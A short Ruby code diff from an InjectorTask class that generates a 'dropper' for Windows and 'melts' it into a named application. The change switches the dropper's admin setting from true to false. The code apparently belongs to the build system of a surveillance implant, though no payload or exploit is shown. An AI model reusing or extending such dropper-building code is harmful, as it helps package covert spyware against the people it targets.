@@ -102,7 +102,7 @@ class InjectorTask
           # generate the dropper
           params = {'factory' => {'_id' => rule.action_param},
                     'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
-                    'melt' => {'admin' => true, 'appname' => appname}
+                    'melt' => {'admin' => false, 'appname' => appname}
                     }
           build = Build.factory(:windows)
           build.create params
